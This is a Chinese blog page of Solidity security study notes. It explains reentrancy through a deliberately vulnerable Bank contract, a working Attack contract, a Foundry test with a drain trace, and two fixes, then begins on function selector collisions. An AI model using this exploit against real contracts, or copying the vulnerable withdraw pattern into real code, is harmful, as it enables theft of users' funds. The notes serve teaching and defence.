

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">

  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
  <link rel="icon" href="/img/fluid.png">
  

  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="Wangxiaowang">
  <meta name="keywords" content="">
  
    <meta name="description" content="S01 重入攻击重入攻击。曾经导致以太坊分叉为ETH和ETC（以太经典） 有很多大公司被盗了币 重入攻击时合约中最常见的一种攻击，攻击者通过合约漏洞(例如 fallback函数)循环调用合约，将合约中资产转走或者铸造大量代币 0xAA 抢银行的故事为了让大家更好理解，这里讲一个”黑客0xAA抢银行”的故事。 以太坊银行的柜员都是机器人（Robot），由智能合约控制。当正常用户（User）来银行取钱">
<meta property="og:type" content="article">
<meta property="og:title" content="08-9Solidity笔记之十合约安全项">
<meta property="og:url" content="http://example.com/2025/08/21/08-9Solidity%E7%AC%94%E8%AE%B0%E4%B9%8B%E5%8D%81%E5%90%88%E7%BA%A6%E5%AE%89%E5%85%A8%E9%A1%B9/index.html">
<meta property="og:site_name" content="Wang">
<meta property="og:description" content="S01 重入攻击重入攻击。曾经导致以太坊分叉为ETH和ETC（以太经典） 有很多大公司被盗了币 重入攻击时合约中最常见的一种攻击，攻击者通过合约漏洞(例如 fallback函数)循环调用合约，将合约中资产转走或者铸造大量代币 0xAA 抢银行的故事为了让大家更好理解，这里讲一个”黑客0xAA抢银行”的故事。 以太坊银行的柜员都是机器人（Robot），由智能合约控制。当正常用户（User）来银行取钱">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://example.com/img/web3/eth2.jpg">
<meta property="article:published_time" content="2025-08-21T02:29:30.000Z">
<meta property="article:modified_time" content="2025-08-22T07:13:01.422Z">
<meta property="article:author" content="Wangxiaowang">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="http://example.com/img/web3/eth2.jpg">
  
  
    <meta name="referrer" content="no-referrer-when-downgrade">
  
  
  <title>08-9Solidity笔记之十合约安全项 - Wang</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">



<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":"37fd8385820c4abc0e564a2c423b7511","google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  

  
    <!-- Baidu Analytics -->
    <script async>
      if (!Fluid.ctx.dnt) {
        var _hmt = _hmt || [];
        (function() {
          var hm = document.createElement("script");
          hm.src = "https://hm.baidu.com/hm.js?37fd8385820c4abc0e564a2c423b7511";
          var s = document.getElementsByTagName("script")[0];
          s.parentNode.insertBefore(hm, s);
        })();
      }
    </script>
  

  

  

  

  



  
<meta name="generator" content="Hexo 7.3.0"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>Home</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/" target="_self">
                <i class="iconfont icon-home-fill"></i>
                <span>首页</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/" target="_self">
                <i class="iconfont icon-archive-fill"></i>
                <span>归档</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/" target="_self">
                <i class="iconfont icon-category-fill"></i>
                <span>分类</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/" target="_self">
                <i class="iconfont icon-tags-fill"></i>
                <span>标签</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/" target="_self">
                <i class="iconfont icon-user-fill"></i>
                <span>关于</span>
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/img/web3/solidity1.jpeg') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="08-9Solidity笔记之十合约安全项"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2025-08-21 10:29" pubdate>
          2025年8月21日 上午
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          11k 字
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          91 分钟
        
      </span>
    

    
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <h1 id="seo-header">08-9Solidity笔记之十合约安全项</h1>
            
            
              <div class="markdown-body">
                
                <h1 id="S01-重入攻击"><a href="#S01-重入攻击" class="headerlink" title="S01 重入攻击"></a>S01 重入攻击</h1><p>重入攻击。曾经导致以太坊分叉为ETH和ETC（以太经典） 有很多大公司被盗了币</p>
<p>重入攻击时合约中最常见的一种攻击，攻击者通过合约漏洞(例如 fallback函数)循环调用合约，将合约中资产转走或者铸造大量代币</p>
<h2 id="0xAA-抢银行的故事"><a href="#0xAA-抢银行的故事" class="headerlink" title="0xAA 抢银行的故事"></a><code>0xAA</code> 抢银行的故事</h2><p>为了让大家更好理解，这里讲一个”黑客<code>0xAA</code>抢银行”的故事。</p>
<p>以太坊银行的柜员都是机器人（Robot），由智能合约控制。当正常用户（User）来银行取钱时，它的服务流程：</p>
<ol>
<li>查询用户的 <code>ETH</code> 余额，如果大于 0，进行下一步。</li>
<li>将用户的 <code>ETH</code> 余额从银行转给用户，并询问用户是否收到。</li>
<li>将用户名下的余额更新为<code>0</code>。</li>
</ol>
<p>一天黑客 <code>0xAA</code> 来到了银行，这是他和机器人柜员的对话：</p>
<ul>
<li>0xAA : 我要取钱，<code>1 ETH</code>。</li>
<li>Robot: 正在查询您的余额：<code>1 ETH</code>。正在转帐<code>1 ETH</code>到您的账户。您收到钱了吗？</li>
<li>0xAA : 等等，我要取钱，<code>1 ETH</code>。</li>
<li>Robot: 正在查询您的余额：<code>1 ETH</code>。正在转帐<code>1 ETH</code>到您的账户。您收到钱了吗？</li>
<li>0xAA : 等等，我要取钱，<code>1 ETH</code>。</li>
<li>Robot: 正在查询您的余额：<code>1 ETH</code>。正在转帐<code>1 ETH</code>到您的账户。您收到钱了吗？</li>
<li>0xAA : 等等，我要取钱，<code>1 ETH</code>。</li>
<li>…</li>
</ul>
<p>最后，<code>0xAA</code>通过重入攻击的漏洞，把银行的资产搬空了，银行卒。</p>
<p><img src="/img/web3/S01-1.png" srcset="/img/loading.gif" lazyload alt="S01-1"></p>
<h2 id="漏洞合约例子"><a href="#漏洞合约例子" class="headerlink" title="漏洞合约例子"></a>漏洞合约例子</h2><h3 id="银行合约"><a href="#银行合约" class="headerlink" title="银行合约"></a>银行合约</h3><p>银行合约非常简单，包含<code>1</code>个状态变量<code>balanceOf</code>记录所有用户的以太坊余额；包含<code>3</code>个函数：</p>
<ul>
<li><code>deposit()</code>：存款函数，将<code>ETH</code>存入银行合约，并更新用户的余额。</li>
<li><code>withdraw()</code>：提款函数，将调用者的余额转给它。具体步骤和上面故事中一样：查询余额，转账，更新余额。<strong>注意：这个函数有重入漏洞！</strong></li>
<li><code>getBalance()</code>：获取银行合约里的<code>ETH</code>余额。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract Bank &#123;<br>    mapping (address =&gt; uint256) public balanceOf;    // 余额mapping<br><br>    // 存入ether，并更新余额<br>    function deposit() external payable &#123;<br>        balanceOf[msg.sender] += msg.value;<br>    &#125;<br><br>    // 提取msg.sender的全部ether<br>    function withdraw() external &#123;<br>        uint256 balance = balanceOf[msg.sender]; // 获取余额<br>        require(balance &gt; 0, &quot;Insufficient balance&quot;);<br>        // 转账 ether !!! 可能激活恶意合约的fallback/receive函数，有重入风险！<br>        (bool success, ) = msg.sender.call&#123;value: balance&#125;(&quot;&quot;);<br>        require(success, &quot;Failed to send Ether&quot;);<br>        // 更新余额<br>        balanceOf[msg.sender] = 0;<br>    &#125;<br><br>    // 获取银行合约的余额<br>    function getBalance() external view returns (uint256) &#123;<br>        return address(this).balance;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>



<h3 id="攻击合约"><a href="#攻击合约" class="headerlink" title="攻击合约"></a>攻击合约</h3><p>重入攻击的一个攻击点就是合约转账<code>ETH</code>的地方：转账<code>ETH</code>的目标地址如果是合约，会触发对方合约的<code>fallback</code>（回退）函数，从而造成循环调用的可能。如果你不了解回退函数，可以阅读<a target="_blank" rel="noopener" href="https://github.com/AmazingAng/WTF-Solidity/blob/main/19_Fallback/readme.md">WTF Solidity 极简教程第 19 讲：接收 ETH</a>。<code>Bank</code>合约在<code>withdraw()</code>函数中存在<code>ETH</code>转账：</p>
<figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gauss">(<span class="hljs-keyword">bool</span> success, ) = msg.sender.<span class="hljs-keyword">call</span>&#123;value: <span class="hljs-built_in">balance</span>&#125;(<span class="hljs-string">&quot;&quot;</span>);<br></code></pre></td></tr></table></figure>



<p>假如黑客在攻击合约中的<code>fallback()</code>或<code>receive()</code>函数中重新调用了<code>Bank</code>合约的<code>withdraw()</code>函数，就会造成<code>0xAA</code>抢银行故事中的循环调用，不断让<code>Bank</code>合约转账给攻击者，最终将合约的<code>ETH</code>提空。</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">receive</span>() external payable &#123;<br>    bank<span class="hljs-selector-class">.withdraw</span>();<br>&#125;<br></code></pre></td></tr></table></figure>



<p>下面我们看下攻击合约，它的逻辑非常简单，就是通过<code>receive()</code>回退函数循环调用<code>Bank</code>合约的<code>withdraw()</code>函数。它有<code>1</code>个状态变量<code>bank</code>用于记录<code>Bank</code>合约地址。它包含<code>4</code>个函数：</p>
<ul>
<li>构造函数: 初始化<code>Bank</code>合约地址。</li>
<li><code>receive()</code>: 回调函数，在接收<code>ETH</code>时被触发，并再次调用<code>Bank</code>合约的<code>withdraw()</code>函数，循环提款。</li>
<li><code>attack()</code>：攻击函数，先<code>Bank</code>合约的<code>deposit()</code>函数存款，然后调用<code>withdraw()</code>发起第一次提款，之后<code>Bank</code>合约的<code>withdraw()</code>函数和攻击合约的<code>receive()</code>函数会循环调用，将<code>Bank</code>合约的<code>ETH</code>提空。</li>
<li><code>getBalance()</code>：获取攻击合约里的<code>ETH</code>余额。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract Attack &#123;<br>    Bank public bank; // Bank合约地址<br><br>    // 初始化Bank合约地址<br>    constructor(Bank _bank) &#123;<br>        bank = _bank;<br>    &#125;<br><br>    // 回调函数，用于重入攻击Bank合约，反复的调用目标的withdraw函数<br>    receive() external payable &#123;<br>        if (bank.getBalance() &gt;= 1 ether) &#123;<br>            bank.withdraw();<br>        &#125;<br>    &#125;<br><br>    // 攻击函数，调用时 msg.value 设为 1 ether<br>    function attack() external payable &#123;<br>        require(msg.value == 1 ether, &quot;Require 1 Ether to attack&quot;);<br>        bank.deposit&#123;value: 1 ether&#125;();<br>        bank.withdraw();<br>    &#125;<br><br>    // 获取本合约的余额<br>    function getBalance() external view returns (uint256) &#123;<br>        return address(this).balance;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<h2 id="演示"><a href="#演示" class="headerlink" title="演示"></a>演示</h2><ol>
<li>部署<code>Bank</code>合约，调用<code>deposit()</code>函数，转入<code>20 ETH</code>。</li>
<li>切换到攻击者钱包，部署<code>Attack</code>合约。</li>
<li>调用<code>Attack</code>合约的<code>attack()</code>函数发动攻击，调用时需转账<code>1 ETH</code>。</li>
<li>调用<code>Bank</code>合约的<code>getBalance()</code>函数，发现余额已被提空。</li>
<li>调用<code>Attack</code>合约的<code>getBalance()</code>函数，可以看到余额变为<code>21 ETH</code>，重入攻击成功。</li>
</ol>
<p>当然，不仅仅<code>ETH</code>转账会触发重入攻击，<code>ERC721</code>和<code>ERC1155</code>的<code>safeTransfer()</code>和<code>safeTransferFrom()</code>安全转账函数，还有<code>ERC777</code>的<code>callback</code>函数，都可能会引发重入攻击。所以这更多的是一个宏观上的设计问题，而不仅仅局限于ETH转账本身。</p>
<ul>
<li>演示测试攻击合约的代码</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract AttackTest is Test &#123;<br>    Bank public bank;<br>    Attack public attack;<br>    function setUp() public &#123;<br>        bank = new Bank(); // 部署Bank合约<br>        vm.deal(address(this), 1000 * 1e18);<br>        bank.deposit&#123;value: 3 * 1e18&#125;();// 往 bank充值3颗ETH<br>        attack = new Attack(bank); // 部署攻击合约<br>    &#125;<br>    function test_attack() public &#123;<br>        // 攻击执行<br>        console.log(&quot;attack start&quot;);<br>        attack.attack&#123;value: 1 * 1e18&#125;();<br>        // 测试断言：例如：检查Bank合约的余额是否被耗尽<br>        assertEq(address(bank).balance, 0, &quot;Bank should be drained&quot;);<br>        console.log(&quot;attack end&quot;);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<ul>
<li>运行情况打印：循环调用不停的重入攻击</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs shell">Traces:<br>  [89457] AttackTest::test_attack()<br>    ├─ [0] console::log(&quot;attack start&quot;) [staticcall]<br>    │   └─ ← [Stop]<br>    ├─ [70996] Attack::attack&#123;value: 1000000000000000000&#125;()<br>    │   ├─ [22559] Bank::deposit&#123;value: 1000000000000000000&#125;()<br>    │   │   └─ ← [Stop]<br>    │   ├─ [36132] Bank::withdraw()<br>    │   │   ├─ [28467] Attack::receive&#123;value: 1000000000000000000&#125;()<br>    │   │   │   ├─ [312] Bank::getBalance() [staticcall]<br>    │   │   │   │   └─ ← [Return] 3000000000000000000 [3e18]<br>    │   │   │   ├─ [26982] Bank::withdraw()<br>    │   │   │   │   ├─ [19317] Attack::receive&#123;value: 1000000000000000000&#125;()<br>    │   │   │   │   │   ├─ [312] Bank::getBalance() [staticcall]<br>    │   │   │   │   │   │   └─ ← [Return] 2000000000000000000 [2e18]<br>    │   │   │   │   │   ├─ [17832] Bank::withdraw()<br>    │   │   │   │   │   │   ├─ [10167] Attack::receive&#123;value: 1000000000000000000&#125;()<br>    │   │   │   │   │   │   │   ├─ [312] Bank::getBalance() [staticcall]<br>    │   │   │   │   │   │   │   │   └─ ← [Return] 1000000000000000000 [1e18]<br>    │   │   │   │   │   │   │   ├─ [8682] Bank::withdraw()<br>    │   │   │   │   │   │   │   │   ├─ [1017] Attack::receive&#123;value: 1000000000000000000&#125;()<br>    │   │   │   │   │   │   │   │   │   ├─ [312] Bank::getBalance() [staticcall]<br>    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0<br>    │   │   │   │   │   │   │   │   │   └─ ← [Stop]<br>    │   │   │   │   │   │   │   │   └─ ← [Stop]<br>    │   │   │   │   │   │   │   └─ ← [Stop]<br>    │   │   │   │   │   │   └─ ← [Stop]<br>    │   │   │   │   │   └─ ← [Stop]<br>    │   │   │   │   └─ ← [Stop]<br>    │   │   │   └─ ← [Stop]<br>    │   │   └─ ← [Stop]<br>    │   └─ ← [Stop]<br>    ├─ [0] console::log(&quot;attack end&quot;) [staticcall]<br>    │   └─ ← [Stop]<br>    └─ ← [Stop]<br><br></code></pre></td></tr></table></figure>



<h3 id="检查-影响-交互模式"><a href="#检查-影响-交互模式" class="headerlink" title="检查-影响-交互模式"></a>检查-影响-交互模式</h3><p>检查-影响-交互模式强调编写函数时，要先检查状态变量是否符合要求，紧接着更新状态变量（例如余额），最后再和别的合约交互。如果我们将<code>Bank</code>合约<code>withdraw()</code>函数中的更新余额提前到转账<code>ETH</code>之前，就可以修复漏洞：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function withdraw() external &#123;<br>    uint256 balance = balanceOf[msg.sender];<br>    require(balance &gt; 0, &quot;Insufficient balance&quot;);<br>    // 检查-效果-交互模式（checks-effect-interaction）：先更新余额变化，再发送ETH<br>    // 重入攻击的时候，balanceOf[msg.sender]已经被更新为0了，不能通过上面的检查。<br>    balanceOf[msg.sender] = 0;<br>    (bool success, ) = msg.sender.call&#123;value: balance&#125;(&quot;&quot;);<br>    require(success, &quot;Failed to send Ether&quot;);<br>&#125;<br></code></pre></td></tr></table></figure>



<h3 id="重入锁"><a href="#重入锁" class="headerlink" title="重入锁"></a>重入锁</h3><p>重入锁是一种防止重入函数的修饰器（modifier），它包含一个默认为<code>0</code>的状态变量<code>_status</code>。被<code>nonReentrant</code>重入锁修饰的函数，在第一次调用时会检查<code>_status</code>是否为<code>0</code>，紧接着将<code>_status</code>的值改为<code>1</code>，调用结束后才会再改为<code>0</code>。这样，当攻击合约在调用结束前第二次的调用就会报错，重入攻击失败。如果你不了解修饰器，可以阅读<a target="_blank" rel="noopener" href="https://github.com/AmazingAng/WTF-Solidity/blob/main/11_Modifier/readme.md">WTF Solidity 极简教程第 11 讲：修饰器</a>。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs solidity">uint256 private _status; // 重入锁<br><br>// 重入锁<br>modifier nonReentrant() &#123;<br>    // 在第一次调用 nonReentrant 时，_status 将是 0<br>    require(_status == 0, &quot;ReentrancyGuard: reentrant call&quot;);<br>    // 在此之后对 nonReentrant 的任何调用都将失败<br>    _status = 1;<br>    _;<br>    // 调用结束，将 _status 恢复为0<br>    _status = 0;<br>&#125;<br></code></pre></td></tr></table></figure>



<p>只需要用<code>nonReentrant</code>重入锁修饰<code>withdraw()</code>函数，就可以预防重入攻击了。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// 用重入锁保护有漏洞的函数<br>function withdraw() external nonReentrant&#123;<br>    uint256 balance = balanceOf[msg.sender];<br>    require(balance &gt; 0, &quot;Insufficient balance&quot;);<br><br>    (bool success, ) = msg.sender.call&#123;value: balance&#125;(&quot;&quot;);<br>    require(success, &quot;Failed to send Ether&quot;);<br><br>    balanceOf[msg.sender] = 0;<br>&#125;<br></code></pre></td></tr></table></figure>



<p>此外，OpenZeppelin 也提倡遵循 PullPayment(拉取支付)模式以避免潜在的重入攻击。其原理是通过引入第三方(escrow)，将原先的“主动转账”分解为“转账者发起转账”加上“接受者主动拉取”。当想要发起一笔转账时，会通过<code>_asyncTransfer(address dest, uint256 amount)</code>将待转账金额存储到第三方合约中，从而避免因重入导致的自身资产损失。而当接受者想要接受转账时，需要主动调用<code>withdrawPayments(address payable payee)</code>进行资产的主动获取。</p>
<p><strong>OpenZeppelin 提供了 <code>ReentrancyGuard</code> 合约，使用修饰器防止重入</strong></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>我们介绍了以太坊最常见的一种攻击——重入攻击，并编了一个<code>0xAA</code>抢银行的小故事方便大家理解，最后我们介绍了两种预防重入攻击的办法：检查-影响-交互模式（checks-effect-interaction）和重入锁。在例子中，黑客利用了回退函数在目标合约进行<code>ETH</code>转账时进行重入攻击。实际业务中，<code>ERC721</code>和<code>ERC1155</code>的<code>safeTransfer()</code>和<code>safeTransferFrom()</code>安全转账函数，还有<code>ERC777</code>的回退函数，都可能会引发重入攻击。对于新手，我的建议是用重入锁保护所有可能改变合约状态的<code>external</code>函数，虽然可能会消耗更多的<code>gas</code>，但是可以预防更大的损失。</p>
<h1 id="S02-选择器碰撞"><a href="#S02-选择器碰撞" class="headerlink" title="S02. 选择器碰撞"></a>S02. 选择器碰撞</h1><p>这一讲，我们将介绍选择器碰撞攻击，它是导致跨链桥 Poly Network 被黑的原因之一。在2021年8月，Poly Network在ETH，BSC，和Polygon上的跨链桥合约被盗，损失高达6.11亿美元（<a target="_blank" rel="noopener" href="https://rekt.news/zh/polynetwork-rekt/">总结</a>）。这是2021年最大的区块链黑客事件，也是历史被盗金额榜单上第2名，仅次于 Ronin 桥黑客事件。</p>
<h2 id="选择器碰撞"><a href="#选择器碰撞" class="headerlink" title="选择器碰撞"></a>选择器碰撞</h2><p>以太坊智能合约中，函数选择器是函数签名 <code>&quot;&lt;function name&gt;(&lt;function input types&gt;)&quot;</code> 的哈希值的前<code>4</code>个字节（<code>8</code>位十六进制）。当用户调用合约的函数时，<code>calldata</code>的前<code>4</code>字节就是目标函数的选择器，决定了调用哪个函数。如果你不了解它，可以阅读<a target="_blank" rel="noopener" href="https://github.com/AmazingAng/WTF-Solidity/blob/main/29_Selector/readme.md">WTF Solidity极简教程第29讲：函数选择器</a>。</p>
<p>由于函数选择器只有<code>4</code>字节，非常短，很容易被碰撞出来：即我们很容易找到两个不同的函数，但是他们有着相同的函数选择器。比如<code>transferFrom(address,address,uint256)</code>和<code>gasprice_bit_ether(int128)</code>有着相同的选择器：<code>0x23b872dd</code>。当然你也可以写个脚本暴力破解。</p>
<p>大家可以用这两个网站来查同一个选择器对应的不同函数：</p>
<ol>
<li><a target="_blank" rel="noopener" href="https://www.4byte.directory/">https://www.4byte.directory/</a></li>
<li><a target="_blank" rel="noopener" href="https://sig.eth.samczsun.com/">https://sig.eth.samczsun.com/</a></li>
</ol>
<p>你也可以使用下面的<code>Power Clash</code>工具进行暴力破解：</p>
<ol>
<li>PowerClash: <a target="_blank" rel="noopener" href="https://github.com/AmazingAng/power-clash">https://github.com/AmazingAng/power-clash</a></li>
</ol>
<p>相比之下，钱包的公钥有<code>64</code>字节，被碰撞出来的概率几乎为<code>0</code>，非常安全。</p>
<h2 id="0xAA-解决斯芬克斯之谜"><a href="#0xAA-解决斯芬克斯之谜" class="headerlink" title="0xAA 解决斯芬克斯之谜"></a><code>0xAA</code> 解决斯芬克斯之谜</h2><p>以太坊的人得罪了天神，天神震怒。天后赫拉为了惩罚以太坊的人，在以太坊的峭崖上降下一个名叫斯芬克斯的人面狮身的女妖。她向每一个路过悬崖的以太坊用户提出一个谜语：“什么东西在早晨用四只脚走路，中午两只脚走路，晚间三只脚走路，在一切生物中这是唯一的用不同数目的脚走路的生物。脚最多的时候，正是速度和力量最小的时候。”对于这个奥妙费解的谜语，凡猜中者即可活命，凡猜不中者一律被吃掉。过路的人全被斯芬克斯吃了，以太坊用户陷入恐惧之中。斯芬克斯用选择器<code>0x10cd2dc7</code>来验证答案是否正确。</p>
<p>有一天上午，俄狄浦斯路过此地，会见了女妖，并猜中了这神秘奥妙之谜。他说：“这是<code>&quot;function man()&quot;</code>啊！在生命的早晨，他是个孩子，用两条腿和两只手爬行；到了生命的中午，他变成壮年，只用两条腿走路；到了生命的傍晚，他年老体衰，必须借助拐杖走路，所以被称为三只脚。”谜语被猜中后，俄狄浦斯得以生还。</p>
